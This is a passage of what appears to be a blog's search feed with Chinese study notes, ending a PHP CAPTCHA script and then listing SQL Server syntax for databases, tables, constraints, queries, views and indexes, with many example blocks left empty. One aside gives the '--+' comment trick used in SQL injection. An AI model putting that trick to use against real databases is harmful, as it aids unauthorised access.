class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">50</span>,<span class="number">200</span>));</span><br><span class="line"><span class="title function_ invoke__">imageline</span>(<span class="variable">$image</span>,<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">99</span>),<span class="title function_ invoke__">mt_rand</span>(<span class="number">1</span>,<span class="number">29</span>),<span class="variable">$linecolor</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:image/png&#x27;</span>); <span class="comment">// 5.强制浏览器输出.png格式图片文件</span></span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$image</span>); <span class="comment">// 6.输出图片到浏览器</span></span><br><span class="line"><span class="title function_ invoke__">imagedestroy</span>(<span class="variable">$image</span>); <span class="comment">// 7.销毁图片</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、PHP技巧"><a href="#五、PHP技巧" class="headerlink" title="五、PHP技巧"></a>五、PHP技巧</h2><ul><li>显示中文<ol><li><code>&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;</code></li><li><code>`&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); ?&gt;</code></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL语句</title>
      <link href="/posts/b51e1490.html"/>
      <url>/posts/b51e1490.html</url>
      
        <content type="html"><![CDATA[<h1 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h1><blockquote><p><a href="https://zhuanlan.zhihu.com/p/101220569">查询、视图和游标</a></p><p><a href=".\a0eceee2">text::Transact——SQL</a> </p><p>单行注释：<code>--</code>（— 后面有空格，所以sql注入是 —+ ）</p><p>多行注释：<code>/**/</code></p></blockquote><hr><h2 id="一、数据库"><a href="#一、数据库" class="headerlink" title="一、数据库"></a>一、数据库</h2><h3 id="1-数据库结构"><a href="#1-数据库结构" class="headerlink" title="1 数据库结构"></a>1 数据库结构</h3><ul><li><p>数据文件</p></li><li><p>日志文件</p></li><li><p>文件组</p><blockquote><p>一个数据文件只能存在于一个文件组中，一个文件组也只能被一个数据库使用。</p></blockquote></li></ul><h3 id="2-系统数据库"><a href="#2-系统数据库" class="headerlink" title="2 系统数据库"></a>2 系统数据库</h3><ul><li><p>master数据库</p><blockquote><p>核心数据库，记录所有系统级信息。包括实例范围的元数据（例如登入账户）、端点、连接服务器和系统配置信息。</p></blockquote></li><li><p>model数据库</p><blockquote><p>所有用户数据库的创建模板，必须始终存在于Microsoft SQL Server系统中。</p></blockquote></li><li><p>msdb数据库</p><blockquote><p>SQL Server Agent使用msdb数据库来计划和警报作业</p></blockquote></li><li><p>tempdb数据库</p><blockquote><p>用作系统的临时存储。</p><p>每次重启时SQL Server都会重新创建tempdb数据库，从而获得一个干净的数据库副本。</p></blockquote></li><li><p>resource数据库（只读和隐藏的数据库）</p><blockquote><p>包含Microsoft SQL Server中的所有系统对象。</p></blockquote></li></ul><h3 id="3-创建"><a href="#3-创建" class="headerlink" title="3 创建"></a>3 创建</h3><ul><li><p>界面</p><blockquote><p>右键数据库创建——修改数值</p></blockquote></li><li><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Create</span> database 库名</span><br><span class="line">[ <span class="keyword">on</span></span><br><span class="line">[ filegroup 文件组名]</span><br><span class="line">(name <span class="operator">=</span> 逻辑名,</span><br><span class="line">  filename <span class="operator">=</span> <span class="string">&#x27;路径+文件名&#x27;</span>,  <span class="comment">--主库.mdf  次库.ndf</span></span><br><span class="line">  size <span class="operator">=</span> 初始大小,</span><br><span class="line">  maxsize <span class="operator">=</span> 最大大小,</span><br><span class="line">  filegrowth <span class="operator">=</span> 自动增长,)]</span><br><span class="line">  </span><br><span class="line">[ log <span class="keyword">on</span></span><br><span class="line">[ filegroup 文件组名]</span><br><span class="line">(name <span class="operator">=</span> 逻辑名,</span><br><span class="line">  filename <span class="operator">=</span> <span class="string">&#x27;路径+文件名&#x27;</span>,  <span class="comment">--日志.ldf</span></span><br><span class="line">  size <span class="operator">=</span> 初始大小,</span><br><span class="line">  maxsize <span class="operator">=</span> 最大大小,</span><br><span class="line">  filegrowth <span class="operator">=</span> 自动增长,)]</span><br><span class="line">[<span class="keyword">collate</span> 数据库校验方式名称]</span><br><span class="line">[<span class="keyword">for</span> attach]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- []语句表示可以选用或不选用</span></span><br><span class="line"><span class="comment">-- ()语句表示除最后一行外其余命令用 , 隔开</span></span><br><span class="line"><span class="comment">-- 数据库校验可以选择：Windows校验方式，SQL校验方式</span></span><br><span class="line"><span class="comment">-- for attach 表示将已经存在的数据库文件附加到新的数据库中</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="4-修改"><a href="#4-修改" class="headerlink" title="4 修改"></a>4 修改</h3><ul><li><p>界面</p><blockquote><p>右键数据库属性</p></blockquote></li><li><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> database 数据库名称</span><br><span class="line"><span class="keyword">add</span> file(具体文件格式) <span class="comment">-- 向数据库中添加数据文件</span></span><br><span class="line">  [ ,...n ]</span><br><span class="line">  [ <span class="keyword">to</span> filegroup 文件组名]</span><br><span class="line">  </span><br><span class="line"><span class="keyword">add</span> log file(具体文件格式) <span class="comment">-- 向数据库中添加日志文件</span></span><br><span class="line">  [ ,...n ]</span><br><span class="line">  </span><br><span class="line">  <span class="operator">|</span> remove file 文件逻辑名称 <span class="comment">-- 从数据库中删除文件，并删除物理文件。如果文件不为空则无法删除。</span></span><br><span class="line">  <span class="operator">|</span> modify file(具体文件格式)  <span class="comment">-- 修改文件</span></span><br><span class="line">  <span class="operator">|</span> <span class="keyword">add</span> filegroup 文件组名 <span class="comment">-- 向数据库中添加文件组</span></span><br><span class="line">  <span class="operator">|</span> remove filegroup 文件组名 <span class="comment">-- 从数据库中删除文件组。若文件组非空需要先删除文件组中所有文件</span></span><br><span class="line">  <span class="operator">|</span> modify filegroup 文件组名 <span class="comment">-- 修改文件组名称、设置文件组read_only（只读） | read_write（读写），指定文件组为default（默认文件组）</span></span><br><span class="line">  &#123;</span><br><span class="line">  read_only <span class="operator">|</span> read_write ,</span><br><span class="line">      <span class="operator">|</span> <span class="keyword">default</span> ,</span><br><span class="line">      <span class="operator">|</span>  name <span class="operator">=</span> 新文件组名 &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">-- 具体文件格式：</span></span><br><span class="line">(</span><br><span class="line">    name <span class="operator">=</span> 文件逻辑名称</span><br><span class="line">    [ , newname <span class="operator">=</span> 新文件逻辑名称 ]</span><br><span class="line">    [ , size <span class="operator">=</span> 初始文件大小 ]</span><br><span class="line">    [ , maxsize <span class="operator">=</span> 文件最大容量 ]</span><br><span class="line">    [ , filegrowth <span class="operator">=</span> 文件自动增长容量]</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="5-删除"><a href="#5-删除" class="headerlink" title="5 删除"></a>5 删除</h3><ul><li><p>界面</p><blockquote><p>右键数据库删除。</p></blockquote></li><li><p>SQL语句</p><blockquote><p>drop database 数据库名称 [,…n]</p></blockquote></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="6-查看"><a href="#6-查看" class="headerlink" title="6 查看"></a>6 查看</h3><ul><li><p>界面</p><blockquote><p>右键数据库属性。</p></blockquote></li><li><p>SQL语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查看数据库结构（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpdb [[<span class="variable">@dbname</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="comment">-- 查看文件信息（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpfile [[<span class="variable">@filename</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br><span class="line"><span class="comment">-- 查看文件组名称（不指定显示全部）</span></span><br><span class="line"><span class="keyword">exec</span> Sp_helpfilegroup [[<span class="variable">@filegroupname</span><span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span>]</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="7-迁移"><a href="#7-迁移" class="headerlink" title="7 迁移"></a>7 迁移</h3><ul><li>界面<ul><li>分离：右键数据库——任务——分离</li><li>加载：右键数据库——附加</li></ul></li></ul><hr><h2 id="二、数据表"><a href="#二、数据表" class="headerlink" title="二、数据表"></a>二、数据表</h2><h3 id="1-创建"><a href="#1-创建" class="headerlink" title="1 创建"></a>1 创建</h3><ul><li><a href="https://www.runoob.com/sql/sql-datatypes-general.html">数据类型</a> （下面为补充类型）</li></ul><div class="table-container"><table><thead><tr><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>nchar，nvarchar，ntext</td><td>Unicode字符</td></tr><tr><td>text / ntext</td><td>文本字符型，最大存 2 ^ 31 - 1 / 2 ^ 30 -1 个字符</td></tr><tr><td>money / smallmoney</td><td>货币型，可精确到小数点后四位</td></tr><tr><td>auto_increment</td><td>自动递增，可以自动递增或随机产生一个整数，常用来自动产生唯一编号</td></tr></tbody></table></div><ul><li><p>创建数据表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> ( <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>表约束<span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- &lt;列定义&gt;： &lt;列名&gt; &lt;数据类型&gt; [ default ] [ &#123;列约束&#125; ]</span></span><br></pre></td></tr></table></figure></li><li><p>数据表约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建约束</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="operator">&lt;</span> 约束类型 <span class="operator">&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 允许/不允许为空（缺省值为 NULL） </span></span><br><span class="line"><span class="keyword">NULL</span> <span class="operator">/</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] [ <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 唯一约束（表明某列值必须唯一，允许NULL）</span></span><br><span class="line"><span class="keyword">unique</span> </span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] [ <span class="keyword">unique</span> ]</span><br><span class="line"><span class="comment">-- unique会强制在指定字段上创造一个unique索引，缺省为非聚集索引。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 主键（唯一标识，不允许NULL）</span></span><br><span class="line"><span class="keyword">primary</span> key</span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">primary</span> key ( <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"><span class="comment">-- 一个表只能一个主键（但是可以联合多个列）</span></span><br><span class="line"><span class="comment">-- 定义了primary key的列不能定义unique。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 外键（联立从表主键）</span></span><br><span class="line"><span class="keyword">foreign</span> key</span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">foreign</span> key [ <span class="keyword">references</span> <span class="operator">&lt;</span> 主表名 <span class="operator">&gt;</span> ] ( <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ &#123; , <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> &#125; ] )</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 约束（检查条件）</span></span><br><span class="line"><span class="keyword">check</span></span><br><span class="line">[ <span class="keyword">constraint</span> <span class="operator">&lt;</span> 约束名 <span class="operator">&gt;</span> ] <span class="keyword">check</span> ( <span class="operator">&lt;</span> 条件 <span class="operator">&gt;</span> )</span><br></pre></td></tr></table></figure></li><li><p>查看全部约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.objects</span><br><span class="line"><span class="keyword">where</span> type <span class="keyword">in</span> ( <span class="string">&#x27;c&#x27;</span> , <span class="string">&#x27;d&#x27;</span> , <span class="string">&#x27;f&#x27;</span> , <span class="string">&#x27;pk&#x27;</span> , <span class="string">&#x27;uq&#x27;</span>)</span><br><span class="line"><span class="comment">-- in中分别为：check,default,foreign key,primary key,unique。</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="2-修改"><a href="#2-修改" class="headerlink" title="2 修改"></a>2 修改</h3><ul><li><p>表格式修改</p><ul><li><p>增加列或列约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> </span><br><span class="line"><span class="keyword">add</span> <span class="operator">&lt;</span>列定义<span class="operator">&gt;</span> <span class="operator">|</span> <span class="operator">&lt;</span>完整性约束定义<span class="operator">&gt;</span> </span><br><span class="line"># <span class="operator">&lt;</span>完整性约束定义<span class="operator">&gt;</span> ：<span class="keyword">constraint</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span> <span class="operator">&lt;</span>约束<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>修改列</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> </span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">column</span> <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> <span class="operator">&lt;</span> 数据类型 <span class="operator">&gt;</span> [ <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> ]</span><br><span class="line"># 注：（不能改列名，不能改类型，不能减少宽度，不能<span class="keyword">null</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">not</span> <span class="keyword">null</span>，有其他约束应该先删其他约束）</span><br></pre></td></tr></table></figure></li></ul></li><li><p>表数据修改</p><ul><li><p>插入数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> [(<span class="operator">&lt;</span>列名<span class="number">1</span><span class="operator">&gt;</span>[,<span class="operator">&lt;</span>列名<span class="number">2</span><span class="operator">&gt;</span>...])] # （插入写列名则插入对应列，不写则插入数据要含有全部的列）</span><br><span class="line"><span class="keyword">values</span> (<span class="operator">&lt;</span>值<span class="operator">&gt;</span>) [,(<span class="operator">&lt;</span>值<span class="operator">&gt;</span>)] # （插入一行或多行的值）</span><br><span class="line"># 多行插入：子查询，<span class="keyword">values</span>带多个值。</span><br></pre></td></tr></table></figure></li><li><p>修改数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">set</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">=</span> <span class="operator">&lt;</span>表达式<span class="operator">&gt;</span> [,<span class="operator">&lt;</span>列名<span class="operator">&gt;</span> <span class="operator">=</span> <span class="operator">&lt;</span>表达式<span class="operator">&gt;</span>]...</span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure></li></ul></li></ul><ul><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="3-删除"><a href="#3-删除" class="headerlink" title="3 删除"></a>3 删除</h3><ul><li><p>删除数据表</p><ul><li><p>删除列或约束</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">constraint</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span> <span class="operator">|</span> <span class="keyword">drop</span> <span class="keyword">column</span> <span class="operator">&lt;</span>列名<span class="operator">&gt;</span> </span><br></pre></td></tr></table></figure></li><li><p>删除表</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>删除数据表数据</p><ul><li><p>删除数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span></span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">where</span> <span class="operator">&lt;</span>条件<span class="operator">&gt;</span>]</span><br></pre></td></tr></table></figure></li></ul></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="4-查看"><a href="#4-查看" class="headerlink" title="4 查看"></a>4 查看</h3><ul><li><p>查数据表格式</p><blockquote><p>右键属性。</p></blockquote></li><li><p>查数据表数据</p></li></ul><p><strong>select 单表查询</strong></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> [ <span class="keyword">all</span> <span class="operator">|</span> <span class="keyword">distinct</span> ] [ TOP N [ <span class="keyword">percent</span> ] [ <span class="keyword">with</span> ties ] ]</span><br><span class="line"><span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ <span class="keyword">as</span> 别名<span class="number">1</span> ] [ &#123; <span class="operator">&lt;</span> 列名 <span class="operator">&gt;</span> [ <span class="keyword">as</span> 别名<span class="number">2</span> ] &#125;]</span><br><span class="line"><span class="keyword">from</span> <span class="operator">&lt;</span> 表名 <span class="operator">&gt;</span> [ [ <span class="keyword">as</span> ] 表别名 ]</span><br><span class="line">[ <span class="keyword">where</span> <span class="operator">&lt;</span> 检索条件 <span class="operator">&gt;</span>]</span><br><span class="line">[ <span class="keyword">group</span> <span class="keyword">by</span> <span class="operator">&lt;</span> 列名<span class="number">1</span> <span class="operator">&gt;</span> [ <span class="keyword">having</span> <span class="operator">&lt;</span> 条件表达式 <span class="operator">&gt;</span> ] ]</span><br><span class="line">[ <span class="keyword">order</span> <span class="keyword">by</span> <span class="operator">&lt;</span>列名<span class="number">2</span> <span class="operator">&gt;</span> [ <span class="keyword">asc</span> <span class="operator">|</span> <span class="keyword">desc</span> ] ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- \* ：全部列名。</span></span><br><span class="line"><span class="comment">-- distinct ：去重查询。（需要元组重复才会去重）</span></span><br><span class="line"></span><br><span class="line"># 按照什么值分组</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">having</span> # 分组后按照一定条件筛选。</span><br><span class="line"></span><br><span class="line"># 按照什么排序</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">asc</span><span class="operator">|</span><span class="keyword">desc</span> # 默认升序，（升序 <span class="operator">|</span> 降序）</span><br></pre></td></tr></table></figure><p><strong>比较运算符</strong></p><blockquote><p>常见同python</p></blockquote><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>like</td><td>类似（like是模糊信息，=是确定信息）</td></tr><tr><td>is null</td><td>判断空（不能用=null）</td></tr></tbody></table></div><p>  <strong>通配符</strong></p><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>%</td><td>多个字符</td></tr><tr><td>_</td><td>一个字符</td></tr><tr><td>[ 0~9 ]</td><td>在0~9中的字符</td></tr><tr><td>[ ^3~7 ]</td><td>不在3~7中的字符</td></tr></tbody></table></div><p>  <strong>统计函数</strong></p><blockquote><p>统计无列名，可以用as取别名。</p><p><code>count(distinct)</code>可以消除重复行取和，count对空值不计算，对0计算。</p><p><code>(count *)</code>不消除重复行，不可以用distinct。</p></blockquote><div class="table-container"><table><thead><tr><th>符号</th><th>作用</th></tr></thead><tbody><tr><td>avg</td><td>平均数</td></tr><tr><td>sum</td><td>总数</td></tr><tr><td>max</td><td>最大值</td></tr><tr><td>min</td><td>最小值</td></tr><tr><td>count</td><td>总个数</td></tr></tbody></table></div><p>  <strong>select 多表查询</strong></p><blockquote><p>查询格式同上</p></blockquote><ul><li><p>内连接查询</p><blockquote><p>不符合结果则不输出，表间用 , 隔开是内连接。</p><p><code>inner join</code></p></blockquote></li><li><p>外连接查询</p><blockquote><p>不符合结果输出空。</p><p><a href="https://www.cnblogs.com/menghen/p/12569473.html">外连接查询</a>    <a href="https://www.zhihu.com/question/34559578/answer/2561071157">图解</a></p><p>外连接查询where改成on</p></blockquote></li></ul><div class="table-container"><table><thead><tr><th>语句</th><th>作用</th></tr></thead><tbody><tr><td>left ( outer ) join</td><td>左边表全，右边缺用null补</td></tr><tr><td>right ( outer ) join</td><td>右边表全，左边缺用null补</td></tr><tr><td>full ( outer ) join</td><td>左右表的并集</td></tr><tr><td>cross join</td><td>笛卡尔连接</td></tr></tbody></table></div><ul><li><p>自连接查询</p><blockquote><p>取别名，自己查自己，输出需要的数据。</p></blockquote><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 例：输出薪水大于刘伟的人的薪水</span></span><br><span class="line"><span class="keyword">select</span> x.sal</span><br><span class="line"><span class="keyword">from</span> t <span class="keyword">as</span> x, t <span class="keyword">as</span> y</span><br><span class="line"><span class="keyword">where</span> x.sal <span class="operator">&gt;</span> y.sal <span class="keyword">and</span> y.tn <span class="operator">=</span> <span class="string">&#x27;刘伟&#x27;</span></span><br></pre></td></tr></table></figure></li><li><p>子查询</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 任意（可用 in 代替）</span></span><br><span class="line"><span class="keyword">any</span></span><br><span class="line"><span class="comment">-- 所有</span></span><br><span class="line"><span class="keyword">all</span></span><br><span class="line"><span class="comment">-- （不）存在</span></span><br><span class="line">[<span class="keyword">not</span>] <span class="keyword">exists</span></span><br><span class="line"><span class="comment">-- 联合查询（输出一个结果集，需要同结构的表，会自动去重）</span></span><br><span class="line"><span class="keyword">union</span> </span><br></pre></td></tr></table></figure></li></ul><ul><li><p><code>select ... into &lt; 表名 &gt;</code></p><blockquote><p>把查询结果输入到一个表中。</p></blockquote></li></ul><ul><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="三、视图"><a href="#三、视图" class="headerlink" title="三、视图"></a>三、视图</h2><h3 id="1-创建视图"><a href="#1-创建视图" class="headerlink" title="1 创建视图"></a>1 创建视图</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> view_name [(<span class="keyword">column</span> [ , ... n ])]</span><br><span class="line">[<span class="keyword">with</span> <span class="operator">&lt;</span>view_attribute<span class="operator">&gt;</span> [, ... n ]]</span><br><span class="line"><span class="keyword">as</span> select_statement</span><br><span class="line">[<span class="keyword">with</span> <span class="keyword">check</span> option] [;]  <span class="comment">-- 修改视图需要符合以下语句</span></span><br><span class="line"><span class="operator">&lt;</span> view_attribute <span class="operator">&gt;</span> ::<span class="operator">=</span></span><br><span class="line">&#123;</span><br><span class="line">    [ encryption ]</span><br><span class="line">    [ schemabinding ]</span><br><span class="line">    [ view_metadate ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- [( column [, ... n])]  -- 列是算术表达式，函数，常量派生才需要列名。</span></span><br><span class="line"><span class="comment">-- [ with check option ] [;]  -- 修改视图需要符合以下语句。</span></span><br><span class="line"><span class="comment">-- [ encryption ]  -- 加密后无法修改视图。</span></span><br><span class="line"><span class="comment">-- [ schemabinding ]  -- 绑定框架，不能随便更改框架。</span></span><br><span class="line"><span class="comment">-- [ view_metadate ]  -- 不设置返回视图引用的metadate，否则返回视图自身的metadata。</span></span><br></pre></td></tr></table></figure></li></ul><ul><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">  </span><br></pre></td></tr></table></figure></li></ul><h3 id="2-修改视图"><a href="#2-修改视图" class="headerlink" title="2 修改视图"></a>2 修改视图</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">view</span> view_name</span><br><span class="line"><span class="keyword">as</span> <span class="operator">&lt;</span>子查询<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-查询视图"><a href="#3-查询视图" class="headerlink" title="3 查询视图"></a>3 查询视图</h3><blockquote><p>和表一样。</p></blockquote><ul><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-删除视图"><a href="#4-删除视图" class="headerlink" title="4 删除视图"></a>4 删除视图</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> view_name</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-视图操作"><a href="#5-视图操作" class="headerlink" title="5 视图操作"></a>5 视图操作</h3><blockquote><p>数据操作和表一样。</p></blockquote><ul><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="四、索引"><a href="#四、索引" class="headerlink" title="四、索引"></a>四、索引</h2><h3 id="1-创建索引"><a href="#1-创建索引" class="headerlink" title="1 创建索引"></a>1 创建索引</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [ <span class="keyword">unique</span> ] [ clustered <span class="operator">|</span> nonclustered ] index index_name</span><br><span class="line"><span class="keyword">on</span> table_or_view_name ( column_name [ <span class="keyword">asc</span> <span class="operator">|</span> <span class="keyword">desc</span> ] [ , ... n ] )</span><br><span class="line">[ <span class="keyword">with</span> <span class="operator">&lt;</span> index_option <span class="operator">&gt;</span> [ , ... n] ]</span><br><span class="line">[ <span class="keyword">on</span> &#123; filegroup_name <span class="operator">|</span> &quot;default&quot; &#125; ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- unique：唯一索引</span></span><br><span class="line"><span class="comment">-- clustered：聚集索引</span></span><br><span class="line"><span class="comment">-- nonclustered：非聚集索引</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-修改索引"><a href="#2-修改索引" class="headerlink" title="2 修改索引"></a>2 修改索引</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="3-删除索引"><a href="#3-删除索引" class="headerlink" title="3 删除索引"></a>3 删除索引</h3><ul><li><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index <span class="operator">&lt;</span>index name<span class="operator">&gt;</span> <span class="keyword">on</span> <span class="operator">&lt;</span><span class="keyword">table</span> <span class="keyword">or</span> view_name<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure></li></ul><h3 id="4-查看索引"><a 